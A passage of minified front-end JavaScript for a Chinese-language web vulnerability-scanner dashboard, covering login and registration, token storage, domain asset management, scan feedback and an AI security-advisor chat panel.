window.updateScanStartState=="function"&&window.updateScanStartState()})}function Co(){Vi("auth-check-step1","scan-btn-step1"),Vi("auth-check","scan-btn");try{To()}catch(e){console.warn("restoreAuthCheckbox error:",e)}}var yt=!1;function To(){let e=!1;try{e=localStorage.getItem("vs_auth_checked")==="true"}catch{}let i=document.getElementById("auth-check-step1"),t=document.getElementById("auth-check"),r=document.getElementById("batch-auth-check");if(e){yt=!0,i&&(i.checked=!0),t&&(t.checked=!0),r&&(r.checked=!0),yt=!1;let a=document.getElementById("scan-btn-step1"),o=document.getElementById("scan-btn"),n=document.getElementById("batch-go-btn");a&&(a.disabled=!1),o&&(o.disabled=!1),n&&(n.disabled=!1)}function s(a,o){a&&a.addEventListener("change",function(){if(yt)return;let n=a.checked;yt=!0,o.forEach(function(c){c&&(c.checked=n)}),yt=!1;let d=document.getElementById("scan-btn-step1"),u=document.getElementById("scan-btn"),h=document.getElementById("batch-go-btn");d&&(d.disabled=!n),u&&(u.disabled=!n),h&&(h.disabled=!n);try{localStorage.setItem("vs_auth_checked",n?"true":"false")}catch{}})}s(i,[t,r]),s(t,[i,r]),s(r,[i,t])}function fe(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function Ao(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function st(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}function Gi(e,i){let t=Se(e);t&&(i?(t.disabled=!0,t.dataset.originalText=t.dataset.originalText||t.textContent,t.innerHTML='<span class="spinner" style="width:16px;height:16px;margin-right:6px;border-color:rgba(255,255,255,0.3);border-top-color:#fff"></span>'+fe(t.dataset.originalText)):(t.disabled=!1,t.dataset.originalText&&(t.textContent=t.dataset.originalText)))}function Qt(){try{return localStorage.getItem("vs_token")}catch{return null}}function Xn(e){try{localStorage.setItem("vs_token",e)}catch{}}function Vn(){try{localStorage.removeItem("vs_token")}catch{}}function Oe(){return!!Qt()}function Lo(){try{return localStorage.getItem("vs_username")||""}catch{return""}}function et(){let e=Qt();return e?{Authorization:"Bearer "+e}:{}}function _e(e,i){i=i||{},i.headers=i.headers||{};let t=!!i.skipAuthExpiry,r=Qt();r&&(i.headers.Authorization="Bearer "+r),!i.headers["Content-Type"]&&i.body&&(i.headers["Content-Type"]="application/json");let s=e.indexOf("http")===0?e:Pi+e;return fetch(s,i).then(function(a){if(a.status===404&&e.indexOf("/api/")===0&&e.indexOf("/api/v1/")!==0){let o=e.indexOf("http")===0?e:Pi+"/api/v1"+e.slice(4);return fetch(o,i)}if(a.status===401&&!t){Vn();try{localStorage.removeItem("vs_username")}catch{}throw typeof ft=="function"&&ft(),new Error("登录已过期，请重新登录")}return a}).catch(function(a){throw a.message&&a.message.indexOf("请求失败")>=0?new Error("网络请求失败。请确认本地后端是否已启动。"):a})}async function Gt(){let e=document.getElementById("auth-challenge-question"),i=document.getElementById("auth-challenge-question-reg"),t=document.getElementById("auth-challenge-token"),r=document.getElementById("auth-challenge-token-reg"),s=document.getElementById("login-challenge-answer"),a=document.getElementById("reg-challenge-answer");try{let o=await _e("/api/auth/challenge",{skipAuthExpiry:!0}),n=await Ze(o);n&&n.data&&(n=n.data),e&&(e.textContent="验证码："+(n.question||"请先刷新验证码")),i&&(i.textContent="验证码："+(n.question||"请先刷新验证码")),t&&(t.value=n.token||""),r&&(r.value=n.token||""),s&&(s.value=""),a&&(a.value="")}catch{e&&(e.textContent="验证码加载失败，请刷新页面")}}function Bo(){Gt()}function Gn(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),r=document.getElementById("auth-reset"),s=document.getElementById("auth-logged");e==="register"?(i&&(i.style.display="none"),t&&(t.style.display="block"),r&&(r.style.display="none"),s&&(s.style.display="none"),Gt()):e==="login"?(Gt(),i&&(i.style.display="block"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.style.display="none")):e==="reset"&&(i&&(i.style.display="none"),t&&(t.style.display="none"),r&&(r.style.display="block"),s&&(s.style.display="none"))}function ft(){let e=document.getElementById("auth-guest"),i=document.getElementById("auth-register"),t=document.getElementById("auth-reset"),r=document.getElementById("auth-logged"),s=document.getElementById("scan-login-tip"),a=document.getElementById("api-token-input");if(Oe()){e&&(e.style.display="none"),i&&(i.style.display="none"),t&&(t.style.display="none"),r&&(r.style.display="block"),s&&(s.style.display="none");let o=Lo(),n=document.getElementById("auth-display-name");if(n&&(n.textContent=o||"用户"),a){let d=Qt();a.value=d||"令牌 不可用"}}else e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.style.display="block"),a&&(a.value="登录后显示 令牌");typeof window.updateScanStartState=="function"&&window.updateScanStartState(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()}function Oo(){if(!Oe()){ie("请先登录","error");return}let e=document.getElementById("api-token-input");if(!e||!e.value||e.value.indexOf("登录")!==-1||e.value==="令牌 不可用"){ie("令牌 不可用，请重新登录","error");return}navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e.value).then(function(){ie("令牌 已复制","success")}).catch(function(){ie("复制失败","error")}):ie("浏览器不支持自动复制，请手动选择文本复制","error")}function Ro(){if(!Oe()){ie("请先登录后再修改密码"),Gn("login");return}let e=document.getElementById("reset-new-password"),i=document.getElementById("reset-new-password2"),t=document.getElementById("reset-error");if(!e||!i){ie("密码重置表单加载失败");return}let r=e.value,s=i.value;if(t&&(t.textContent=""),!r||r.length<6){t&&(t.textContent="新密码至少 6 个字符");return}if(r!==s){t&&(t.textContent="两次密码不一致");return}_e("/api/reset-password",{method:"POST",body:JSON.stringify({new_password:r})}).then(Ze).then(function(a){a.success?(ie("密码已修改，请用新密码登录"),Jn()):t.textContent=st(a)||"修改失败"}).catch(function(a){t&&(t.textContent="修改失败: "+a.message)})}function Ji(){let e=document.getElementById("login-username"),i=document.getElementById("login-password");document.getElementById("auth-challenge-token"),document.getElementById("login-challenge-answer");let t=document.getElementById("login-error");if(!e||!i){ie("登录表单加载失败");return}let r=e.value.trim(),s=i.value.trim();if(t&&(t.textContent=""),!r||!s){t&&(t.textContent="请输入用户名和密码");return}_e("/api/login",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify({username:r,password:s})}).then(Ze).then(function(a){let o=a.token||a.data&&a.data.token,n=a.username||a.data&&a.data.username||r;if(o){Xn(o),rn(a.role||a.data&&a.data.role||"member");try{localStorage.setItem("vs_system_role",a.system_role||a.data&&a.data.system_role||"user")}catch{}try{localStorage.setItem("vs_username",n)}catch{}ft(),tt(),He(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon(),ie("登录成功，欢迎 "+n),It("scan"),setTimeout(function(){typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()},0)}else t&&(t.textContent=st(a)||"登录失败")}).catch(function(a){t&&(t.textContent="登录失败: "+a.message)})}function Rt(){let e=document.getElementById("reg-username"),i=document.getElementById("reg-email"),t=document.getElementById("reg-phone"),r=document.getElementById("reg-password"),s=document.getElementById("reg-password2"),a=document.getElementById("register-error");if(!e||!r||!s){ie("注册表单加载失败");return}let o=e.value.trim(),n=i?i.value.trim():"",d=t?t.value.trim():"",u=r.value.trim(),h=s.value.trim(),c=document.getElementById("auth-challenge-token-reg")||document.getElementById("auth-challenge-token"),p=document.getElementById("reg-challenge-answer");if(a&&(a.textContent=""),!o||!u){a&&(a.textContent="请输入用户名和密码");return}if(u!==h){a&&(a.textContent="两次密码不一致");return}if(u.length<6){a&&(a.textContent="密码至少 6 个字符");return}let v={username:o,password:u,challenge_token:c?c.value:"",challenge_answer:p?p.value.trim():""};n&&(v.email=n),d&&(v.phone=d),_e("/api/register",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(v)}).then(Ze).then(function(m){let g=m.token||m.data&&m.data.token,y=m.username||m.data&&m.data.username||o;if(g){Xn(g),rn(m.role||m.data&&m.data.role||"member");try{localStorage.setItem("vs_system_role",m.system_role||m.data&&m.data.system_role||"user")}catch{}try{localStorage.setItem("vs_username",y)}catch{}ft(),tt(),He(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon(),ie("注册成功，欢迎 "+y),It("scan"),setTimeout(function(){typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()},0)}else a&&(a.textContent=st(m)||"注册失败")}).catch(function(m){a&&(a.textContent="注册失败: "+Li(m))})}function Jn(){Vn();try{localStorage.removeItem("vs_username"),localStorage.removeItem("vs_role"),localStorage.removeItem("vs_system_role")}catch{}ft();let e=document.getElementById("nav-alert-badge");e&&(e.style.display="none"),ie("已退出登录"),It("home")}function It(e){try{if(e==="scan"){let s=document.getElementById("page-home");s&&s.classList.add("active"),document.querySelectorAll(".page").forEach(function(n){n.id!=="page-home"&&n.classList.remove("active")});let a=document.querySelector('.nav-item[data-page="scan"]');a&&a.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(n){n.getAttribute("data-page")!=="scan"&&n.classList.remove("active")});let o=document.querySelector(".scan-section");o&&o.scrollIntoView({behavior:"smooth",block:"start"}),typeof window.loadDashboard=="function"&&window.loadDashboard();return}let i=document.getElementById("page-"+e);i&&i.classList.add("active"),document.querySelectorAll(".page").forEach(function(s){s.id!=="page-"+e&&s.classList.remove("active")});let t=e==="result"?"scan":e,r=document.querySelector('.nav-item[data-page="'+t+'"]');r&&r.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(s){s.getAttribute("data-page")!==t&&s.classList.remove("active")}),window.scrollTo({top:0,behavior:"smooth"}),e==="tickets"&&(Ua(),Xe()),e==="assets"&&Ai(),e==="evolution"&&ei(),e==="billing"&&Wn(),e==="audit"&&typeof window.fillAuditTargetFromScan=="function"&&window.fillAuditTargetFromScan()}catch(i){console.error("navigateTo error:",i)}}let vi=[],Mt=0,Mo=3,Po=2500;function ie(e,i){vi.push({msg:e,type:i}),Kn()}function Kn(){if(Mt>=Mo||vi.length===0)return;let e=vi.shift();Mt++;let i=document.getElementById("toast-container");if(!i){Mt--;return}let t=document.createElement("div");t.className="toast";let r="ℹ️";e.type==="error"?r="[错误]":e.type==="success"?r="[成功]":e.type==="warn"&&(r="[警告]");let s=document.createElement("span");s.textContent=r+" ",s.style.marginRight="6px",t.appendChild(s),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),Mt--,Kn()},300)},Po)}function Fo(e,i,t,r){if(!i){ie("finding 名称缺失","error");return}if(!Oe()){ie("请先登录后再标记误报","error");return}if(e.disabled)return;e.disabled=!0;let s=e.innerHTML;e.innerHTML="提交中...";let a=typeof _e=="function"?_e:fetch,o="/api/finding/feedback",n=JSON.stringify({scan_id:t||0,finding_name:i,is_false_positive:!!r,is_confirmed:!r}),d=a(o,{method:"POST",headers:{"Content-Type":"application/json"},body:n});Promise.resolve(d).then(function(u){return u.json().then(function(h){return{ok:u.ok,d:h}})}).then(function(u){if(u.ok&&u.d&&u.d.success){let h=e.closest(".finding-detail");if(h)if(r){h.classList.add("fp-marked"),h.classList.remove("confirmed");let p=h.querySelector(".finding-detail-header");if(p&&!p.querySelector(".fp-badge")){let m=document.createElement("span");m.className="fp-badge",m.textContent="已被标记为误报",p.appendChild(m)}let v=h.querySelector(".finding-feedback-row");if(v&&!v.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.textContent="已标记为误报，将用于优化未来检测",v.appendChild(m)}}else{h.classList.add("confirmed"),h.classList.remove("fp-marked");let p=h.querySelector(".finding-detail-header");if(p&&!p.querySelector(".confirmed-badge")){let m=document.createElement("span");m.className="confirmed-badge",m.textContent="已确认",p.appendChild(m)}let v=h.querySelector(".finding-feedback-row");if(v&&!v.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.style.color="#73c990",m.textContent="已确认为真实漏洞，感谢您的反馈",v.appendChild(m)}}(h||document).querySelectorAll(".finding-feedback-row .finding-feedback-btn").forEach(function(p){p.disabled=!0,p.textContent=p.classList.contains("btn-confirm")?"准确":"误报"}),ie(r?"已记录为误报，感谢反馈！":"已确认为真实漏洞，感谢反馈！","success")}else e.disabled=!1,e.innerHTML=s,ie("提交失败: "+(u.d&&(u.d.error||u.d.detail)||"未知错误"),"error")}).catch(function(u){e.disabled=!1,e.innerHTML=s,ie("提交失败: "+u.message,"error")})}let Je=[];function Ai(){if(!Oe()){zo("asset-list",""),Io("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}_e("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(Je=e.assets,ai(Je)):(Je=[],ai(Je))}).catch(function(e){ie("加载资产失败: "+e.message,"error"),Je=[],ai(Je)})}function ai(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let r='<div class="asset-table-wrap"><table class="asset-table">';r+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(s){let a=s.verified||!1,o=a?"verified":"pending",n=a?"已验证":"待人工复核",d=s.score,u="high";d==null?(d="-",u=""):d<50?u="low":d<75&&(u="medium"),r+="<tr>",r+='<td data-label="域名"><div class="asset-domain">'+fe(s.domain||"")+'</div><div class="asset-meta">'+fe(s.description||"")+"</div></td>",r+='<td data-label="负责人">'+fe(s.owner||"-")+"</td>",r+='<td data-label="验证状态"><span class="asset-badge '+o+'">'+n+"</span></td>",r+='<td data-label="评分"><div class="asset-score '+u+'">'+d+"</div></td>",r+='<td data-label="操作"><div class="asset-actions">',r+='<button class="asset-btn primary" onclick="scanAsset('+s.id+", '"+Ao(s.domain||"")+`')">扫描</button>`,r+='<button class="asset-btn secondary" onclick="editAsset('+s.id+')">编辑</button>',r+='<button class="asset-btn danger" onclick="deleteAsset('+s.id+')">删除</button>',r+="</div></td>",r+="</tr>"}),r+="</tbody></table></div>",i.innerHTML=r}function ei(){if(!Oe()){let i=document.getElementById("evolution-content");i&&(i.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录</p><p class="ticket-empty-hint">登录后使用智能学习、主动监控、团队协作与安全顾问</p></div>');return}let e=document.getElementById("evolution-content");e&&(e.innerHTML='<div class="loading">正在读取进化中心数据...</div>'),_e("/api/evolution/dashboard").then(function(i){return i.json()}).then(function(i){i&&i.success?jo(i):e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>暂未登录或无数据</p></div>')}).catch(function(i){e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>加载失败: '+fe(i.message)+"</p></div>")})}function jo(e){let i=document.getElementById("evolution-content");if(!i)return;let t=Math.round(e.evolution_score||0),r=e.learning||{},s=e.monitoring||{},a=e.team||{},o=r.trend||[],n=r.persistent_issues||[],d=r.recommendations||[],u=r.predicted_next_score,h=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",c="";c+='<div class="evo-score-card">',c+='  <div class="evo-score-label">进化指数</div>',c+='  <div class="evo-score-value" style="color:'+h+'">'+t+"</div>",c+='  <div class="evo-score-bar"><div class="evo-score-fill" style="width:'+t+"%;background:"+h+'"></div></div>',c+='  <div class="evo-score-hint">基于历史扫描、监控告警与团队协作综合计算</div>',c+="</div>",c+='<div class="evo-grid">',c+=Pt("智能学习","","#4b6eaf",[{k:"总扫描次数",v:r.total_scans||0},{k:"平均分",v:r.avg_score||"-"},{k:"最高分",v:r.best_score||"-"},{k:"预测下次",v:u||"-"}],()=>Ft("learning")),c+=Pt("主动监控","","#c75450",[{k:"监控项",v:s.monitors_count||0},{k:"未读告警",v:s.unread_alerts||0},{k:"状态",v:s.monitors_count?"运行中":"未启用"}],()=>Ft("monitoring")),c+=Pt("安全顾问","","#4b6eaf",[{k:"会话记忆",v:"已启用"},{k:"建议数",v:d.length},{k:"响应",v:"实时"}],()=>Ft("ai")),c+=Pt("团队协作","","#73c990",[{k:"加入团队",v:a.teams_count||0},{k:"评论",v:"可发起"},{k:"状态",v:a.teams_count?"已加入":"未加入"}],()=>Ft("team")),c+="</div>",c+='<div class="evo-row">',c+='  <div class="evo-panel">',c+='    <div class="evo-panel-title">评分趋势</div>',o.length===0?c+='    <div class="evo-empty">暂无历史评分，先做一次扫描</div>':(c+='    <div class="evo-trend">',o.forEach(function(p){c+='<div class="evo-trend-item"><div class="evo-trend-score">'+p.score+'</div><div class="evo-trend-date">'+fe(p.date||"")+"</div></div>"}),c+="    </div>"),c+="  </div>",c+='  <div class="evo-panel">',c+='    <div class="evo-panel-title">持续问题</div>',n.length===0?c+='    <div class="evo-empty">暂无持续性问题</div>':(c+='    <ul class="evo-list">',n.forEach(function(p){if(typeof p=="string")c+="<li>"+fe(p)+"</li>";else if(p&&typeof p=="object"){let v=p.name||p.title||p.issue||JSON.stringify(p),m=p.times?' <span class="evo-empty">×'+p.times+"</span>":"",g=p.severity?' <span class="evo-alert-time">['+fe(p.severity)+"]</span>":"";c+="<li>"+fe(v)+m+g+"</li>"}else c+="<li>"+fe(String(p))+"</li>"}),c+="    </ul>"),c+="  </div>",c+="</div>",c+='<div class="evo-panel">',c+='  <div class="evo-panel-title">个性化建议</div>',d.length===0?c+='  <div class="evo-empty">完成更多扫描后，系统会给出更精准的建议</div>':(c+='  <ul class="evo-recs">',d.forEach(function(p){c+="<li>"+fe(p)+"</li>"}),c+="  </ul>"),c+="</div>",s.alerts&&s.alerts.length>0&&(c+='<div class="evo-panel">',c+='  <div class="evo-panel-title">最新告警</div>',c+='  <ul class="evo-alerts">',s.alerts.slice(0,5).forEach(function(p){c+='<li><span class="evo-alert-time">'+fe(p.created_at||"")+"</span> - "+fe(p.message||"")+"</li>"}),c+="  </ul>",c+="</div>"),i.innerHTML=c}function Pt(e,i,t,r,s){let a='<div class="evo-card" style="border-top:2px solid '+t+'" onclick="('+s.toString()+')()">';return a+='  <div class="evo-card-head"><span class="evo-card-icon" style="background:#313335;color:'+t+'">'+i+'</span><span class="evo-card-title">'+e+"</span></div>",a+='  <div class="evo-card-items">',r.forEach(function(o){a+='<div class="evo-card-item"><div class="evo-card-k">'+fe(o.k)+'</div><div class="evo-card-v">'+fe(String(o.v))+"</div></div>"}),a+="  </div>",a+="</div>",a}function Ft(e){let i="";e==="monitoring"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">添加监控</div>',i+='  <div class="evo-detail-form">',i+='    <input id="mon-url" class="evo-input" placeholder="https://示例.com" />',i+='    <input id="mon-freq" class="evo-input" type="number" min="60" value="3600" placeholder="检查频率（秒）" />',i+='    <button class="evo-btn" onclick="createMonitor()">创建监控</button>',i+="  </div>",i+='  <div id="evo-mon-list"></div>',i+="</div>",ie("提示:在弹窗中可创建监控","info")):e==="ai"?(i='<div class="ai-chat-wrap">',i+='  <div class="ai-status-bar" id="ai-status-bar"><span class="ai-status-dot pending"></span><span class="ai-status-text">检测中...</span></div>',i+='  <div class="ai-quick">',i+=`    <button class="ai-quick-btn" onclick="aiSend('我的网站最近有什么风险?')">我的风险</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('怎么修 HSTS 缺失?')">修 HSTS</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('我应该先修哪个问题?')">优先级</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('解释一下 CSP 是什么')">CSP 解释</button>`,i+="  </div>",i+='  <div id="evo-ai-msgs" class="ai-msgs">',i+='    <div class="ai-msg bot">',i+='      <div class="ai-msg-avatar">顾问</div>',i+='      <div class="ai-msg-body">',i+='        <div class="ai-msg-name">安全顾问</div>',i+='        <div class="ai-msg-content">你好！我是Vuln Sentinel的安全顾问。<br><br>我可以帮你：<br>• 分析扫描报告与漏洞优先级<br>• 给出可执行的安全修复步骤<br>• 解释安全概念与配置示例<br>• 基于你的历史给出个性化建议<br><br>试试上方的快捷问题，或直接输入想了解的安全问题。</div>',i+="      </div>",i+="    </div>",i+="  </div>",i+='  <div class="ai-input-bar">',i+='    <textarea id="evo-ai-q" class="ai-input" rows="1" placeholder="想问什么…（Shift+Enter 换行）"></textarea>',i+='    <button class="ai-send-btn" id="ai-send-btn" onclick="aiAsk()">发送</button>',i+="  </div>",i+="</div>",setTimeout(function(){No();let s=document.getElementById("evo-ai-q");s&&(s.addEventListener("keydown",function(a){a.key==="Enter"&&!a.shiftKey&&(a.preventDefault(),Yn())}),s.addEventListener("input",function(){this.style.height="auto",this.style.height=Math.min(this.scrollHeight,120)+"px"}))},100)):e==="team"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">团队协作</div>',i+='  <div class="evo-detail-form">',i+='    <input id="team-name" class="evo-input" placeholder="团队名称" />',i+='    <button class="evo-btn" onclick="createTeam()">创建团队</button>',i+="  </div>",i+='  <div id="evo-team-list"></div>',i+="</div>"):e==="learning"&&(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">智能学习洞察</div>',i+='  <div class="evo-empty">系统会基于您的历史扫描自动归纳模式、预测风险与生成建议</div>',i+="</div>");let t=document.getElementById("evolution-content"),r=document.createElement("div");r.className="evo-modal-bg",r.innerHTML='<div class="evo-modal"><div class="evo-modal-close" onclick="this.parentNode.parentNode.remove()">&times;</div>'+i+"</div>",t.appendChild(r)}function Ho(){let e=document.getElementById("mon-url").value.trim(),i=parseInt(document.getElementById("mon-freq").value)||3600;if(!e){ie("请输入 URL","error");return}_e("/api/monitors",{method:"POST",body:JSON.stringify({url:e,frequency:i})}).then(function(t){return t.json()}).then(function(t){t.id||t.monitor_id?(ie("监控已创建","success"),ei()):ie("创建失败","error")}).catch(function(t){ie("创建失败: "+t.message,"error")})}function Yn(){let e=document.getElementById("evo-ai-q");if(!e)return;let i=e.value.trim();i&&Qn(i)}let oi=!1;function Qn(e){if(oi)return;let i=document.getElementById("evo-ai-q"),t=document.getElementById("evo-ai-msgs"),r=document.getElementById("ai-send-btn");if(!t)return;oi=!0,t.innerHTML+='<div class="ai-msg user">  <div class="ai-msg-avatar user">我</div>  <div class="ai-msg-body">    <div class="ai-msg-content">'+fe(e)+"</div>  </div></div>",i&&(i.value=""),r&&(r.disabled=!0,r.textContent="思考中…");let s="typing-"+Date.now();t.innerHTML+='<div class="ai-msg bot" id="'+s+'">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content"><span class="ai-typing">...</span></div></div></div>',t.scrollTop=t.scrollHeight,_e("/api/ai/chat",{method:"POST",body:JSON.stringify({message:e})}).then(function(a){return a.json()}).then(function(a){let o=document.getElementById(s);o&&o.remove();let n=a&&a.response||a&&a.reply||a&&a.message||JSON.stringify(a),d="";if(a&&a.llm_used){let u=(a.llm_provider||"LLM").toUpperCase();d='<span class="ai-tag real">真 '+fe(u)+"</span>"}else d='<span class="ai-tag local">本地规则</span>';t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body">    <div class="ai-msg-name">安全顾问 '+d+'</div>    <div class="ai-msg-content">'+Do(n)+"</div>  </div></div>",t.scrollTop=t.scrollHeight}).catch(function(a){let o=document.getElementById(s);o&&o.remove(),t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content">请求失败: '+fe(a.message)+"</div></div></div>"}).finally(function(){oi=!1,r&&(r.disabled=!1,r.textContent="发送")})}function No(){let e=document.getElementById("ai-status-bar");e&&fetch("/api/ai/status").then(function(i){return i.json()}).then(function(i){!i||!i.success||(i.llm_enabled&&i.api_key_configured?e.innerHTML='<span class="ai-status-dot ok"></span><span class="ai-status-text">已连接真实 LLM · '+fe(i.provider)+" / "+fe(i.model)+"</span>":e.innerHTML='<span class="ai-status-dot local"></span><span class="ai-status-text">本地规则模式（未配置 LLM Key）</span>')}).catch(function(){e.innerHTML='<span class="ai-status-dot err"></span><span class="ai-status-text">无法获取安全顾问状态</span>'})}function Do(e){if(!e)return"";let i=String(e).split(/```/),t=[];for(let r=0;r<i.length;r++)if(r%2===1)t.push('<pre class="ai-code"><code>'+fe(i[r])+"</code></pre>");else{let s=fe(i[r]);s=s.replace(/`([^`\n]+)`/g,'<code class="ai-code-inline">$1</code>'),s=s.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),s.split(/\n\n+/).forEach(function(o){let n=o.replace(/\n/g," ").trim();n&&t.push("<p>"+n+"</p>")})}return t.join("")}function Uo(){let e=document.getElementById("team-name").value.trim();if(!e){ie("请输入团队名","error");return}_e("/api/teams",{method:"POST",body:JSON.stringify({name:e})}).then(function(i){return i.json()}).then(function(i){i.id||i.team_id?(ie("团队已创建","success"),ei()):ie("创建失败: "+JSON.stringify(i),"error")}).catch(function(i){ie("创建失败: "+i.message,"error")})}function $o(e){let i=Je.find(function(a){return a.id===e});if(!i)return;let t=prompt("修改域名:",i.domain||"");if(t===null)return;let r=prompt("修改负责人:",i.owner||"");if(r===null)return;let s=prompt("修改描述:",i.description||"");s!==null&&_e("/api/assets/"+e,{method:"PATCH",body:JSON.stringify({domain:t.trim(),owner:r.trim(),description:s.trim()})}).then(function(a){return a.json()}).then(function(a){a.id||a.success?(ie("资产更新成功","success"),Ai()):ie(st(a)||"更新失败","error")}).catch(function(a){ie("更新失败: "+a.message,"error")})}function qo(e){confirm("确定要删除此资产吗？")&&_e("/api/assets/"+e,{method:"DELETE"}).then(function(i){if(i.ok||i.status===204)ie("资产已删除","success"),Ai();else return i.json().then(function(t){throw new Error(st(t)||"删除失败")})}).catch(function(i){ie("删除失败: "+i.message,"error")})}function Wo(e,i){if(!i)return;let t=i;/^https?:\/\//i.test(t)||(t="https://"+t),document.getElementById("scan-url").value=t,It("scan"),typeof window.startScanDirect=="function"&&window.startScanDirect()}function Zo(){let e=document.getElementById("ai-chat");e&&(document.getElementById("ai-fab-badge"),e.classList.contains("show")?(e.classList.remove("show"),e.style.display=""):(e.classList.add("show"),e.style.display="",Go(),setTimeout(function(){let i=document.getElementById("ai-input");i&&i.focus()},300)))}function Ge(e,i){let t=document.getElementById("ai-chat-body");if(!t)return null;let r=document.createElement("div");r.className="ai-msg "+(i||"bot");let s=Xo(e||"");r.innerHTML=s;let a=r.querySelectorAll("pre");for(let o=0;o<a.length;o++)(function(n){let d=document.createElement("div");d.className="ai-code-block";let u=document.createElement("button");u.className="ai-code-copy",u.textContent="复制",u.onclick=function(){let h=n.textContent;if(navigator.clipboard)navigator.clipboard.writeText(h).then(function(){u.textContent="已复制",setTimeout(function(){u.textContent="复制"},1500)});else{let c=document.createElement("textarea");c.value=h,document.body.appendChild(c),c.select(),document.execCommand("copy"),document.body.removeChild(c),u.textContent="已复制",setTimeout(function(){u.textContent="复制"},1500)}},n.parentNode.insertBefore(d,n),d.appendChild(u),d.appendChild(n)})(a[o]);return t.appendChild(r),t.scrollTop=t.scrollHeight,i==="bot"&&(document.getElementById("ai-chat").classList.contains("show")||Vo()),r}function Xo(e){if(!e)return"";let i=e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"),t=[];return i=i.replace(/```([\s\S]*?)```/g,function(r,s){let a=s.replace(/^\n+|\n+$/g,"").split(`
`),o="";a.length>0&&/^(nginx|apache|javascript|python|bash|sql|html|css|json|java|php|ruby|go|rust)$/i.test(a[0].trim())&&(o=a[0].trim(),a=a.slice(1));let n=a.join(`
`),d=t.length;return t.push({code:n,lang:o}),"__CODE_BLOCK_"+d+"__"}),i=i.replace(/`([^`\n]+)`/g,'<code class="ai-inline-code">$1</code>'),i=i.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),i=i.replace(/^---\s*$/gm,'<hr class="ai-divider">'),i=i.replace(/(^|\n)((?:\s*[-*]\s+[^\n]+\n?)+)/g,function(r,s,a){let n=a.trim().split(`
`).filter(function(d){return d.trim()}).map(function(d){return"<li>"+d.replace(/^\s*[-*]\s+/,"")+"</li>"}).join("");return s+'<ul class="ai-list">'+n+"</ul>"}),i=i.replace(/(^|\n)((?:\s*\d+\.\s+[^\n]+\n?)+)/g,function(r,s,a){let n=a.trim().split(`
